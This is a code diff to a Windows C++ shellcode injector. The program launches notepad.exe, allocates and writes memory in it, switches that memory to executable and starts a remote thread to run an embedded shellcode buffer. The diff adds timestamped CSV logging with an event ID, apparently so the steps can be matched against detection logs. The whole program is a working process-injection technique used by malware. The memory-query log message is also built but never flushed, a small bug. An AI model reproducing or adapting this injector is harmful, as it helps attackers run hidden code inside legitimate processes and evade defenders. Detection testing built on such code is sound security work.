@@ -1,14 +1,19 @@
 #include <windows.h>
 #include <iostream>
 #include <iomanip>
+#include <fstream>
 #include <sstream>
 
-// print current timestamp in ISO 8601 format, e.g. 2025-08-18 18:03:51.123Z
-void printCurrentTime() {
+// global CSV output stream
+std::ostringstream csv;
+std::string myEventID = "1337";
+
+// get current timestamp in ISO 8601 format, e.g. 2025-08-18 18:03:51.123Z
+std::ostringstream printCurrentTime() {
     SYSTEMTIME st;
     GetSystemTime(&st);
-    std::cout << "[+] "
-        << std::setfill('0')
+    std::ostringstream time;
+    time << std::setfill('0')
         << std::setw(4) << st.wYear << '-'
         << std::setw(2) << st.wMonth << '-'
         << std::setw(2) << st.wDay << ' '
@@ -16,8 +21,19 @@ void printCurrentTime() {
         << std::setw(2) << st.wMinute << ':'
         << std::setw(2) << st.wSecond << '.'
         << std::setw(3) << st.wMilliseconds
-        << " > ";
+        << "Z";
+    std::cout << "[+] " << time.str() << " > ";
+    return time;
 }
+
+
+void printAndAddToCsv(std::string msg) {
+    csv << "\"" << printCurrentTime().str() << "\"," // add qoutes arround string
+        << myEventID << ","
+        << "\"" << msg << "\"" << "\n"; // add qoutes arround string
+    std::cout << msg << "\n";
+}
+
 
 int main(int argc, char** argv) {
 	enum StartupMode { NoWait, WaitTime, WaitForEnter };
@@ -40,9 +56,12 @@ int main(int argc, char** argv) {
         }
     }
 
-    // print current PID
-    printCurrentTime();
-    std::cout << "Injector started with PID " << GetCurrentProcessId() << "\n";
+    csv << "timestamp,event_id,message\n";
+    std::ostringstream msg;
+
+    // print current 
+    msg << "Injector started with PID " << GetCurrentProcessId();
+    printAndAddToCsv(msg.str()); msg.str("");
 
     // start new process to inject to
     LPCWSTR newProcess = L"C:\\Windows\\System32\\notepad.exe";
@@ -84,8 +103,8 @@ int main(int argc, char** argv) {
     // allocate memory to new process
     LPVOID remoteAddrShellCode = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (remoteAddrShellCode) {
-        printCurrentTime();
-        std::cout << "Memory allocated at address " << remoteAddrShellCode << "\n";
+        msg << "Memory allocated at address " << remoteAddrShellCode;
+        printAndAddToCsv(msg.str()); msg.str("");
     }
     else {
         std::cerr << "Failed to allocate memory: " << GetLastError() << "\n";
@@ -97,7 +116,7 @@ int main(int argc, char** argv) {
 	MEMORY_BASIC_INFORMATION mbi;
     if (VirtualQueryEx(hProcess, remoteAddrShellCode, &mbi, sizeof(mbi))) {
         printCurrentTime();
-        std::cout << "Memory region at address " << remoteAddrShellCode << " is State 0x" << std::hex
+        msg << "Memory region at address " << remoteAddrShellCode << " is State 0x" << std::hex
             << mbi.State << std::dec << " with protection 0x" << std::hex << mbi.Protect << std::dec << "\n";
     }
     else {
@@ -111,8 +130,8 @@ int main(int argc, char** argv) {
     // write value into process' memory
     SIZE_T bytesWritten;
     if (WriteProcessMemory(hProcess, remoteAddrShellCode, &shellcode, sizeof(shellcode), &bytesWritten)) {
-        printCurrentTime();
-        std::cout << "Shellcode written to address " << remoteAddrShellCode << "\n";
+        msg << "Shellcode written to address " << remoteAddrShellCode;
+        printAndAddToCsv(msg.str()); msg.str("");
     }
     else {
         std::cerr << "Failed to write memory: " << GetLastError() << "\n";
@@ -123,8 +142,8 @@ int main(int argc, char** argv) {
 	// change memory protection to executable
     DWORD oldProtect;
     if (VirtualProtectEx(hProcess, remoteAddrShellCode, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect)) {
-        printCurrentTime();
-        std::cout << "Memory protection changed to PAGE_EXECUTE_READ" << "\n";
+        msg << "Memory protection changed to PAGE_EXECUTE_READ";
+        printAndAddToCsv(msg.str()); msg.str("");
     }
     else {
         std::cerr << "Failed to change memory protection: " << GetLastError() << "\n";
@@ -136,13 +155,18 @@ int main(int argc, char** argv) {
 	// call create remote thread
     HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteAddrShellCode, nullptr, 0, nullptr);
     if (hThread) {
-        printCurrentTime();
-        std::cout << "Remote thread created successfully" << "\n";
+        msg << "Remote thread created successfully";
+        printAndAddToCsv(msg.str()); msg.str("");
     }
     else {
         std::cerr << "Failed to create remote thread: " << GetLastError() << "\n";
         return 1;
 	}
+
+	// write the csv variable to a file
+    std::ofstream out("output.csv");
+    out << csv.str();
+    out.close();
 
     return 0;
 }
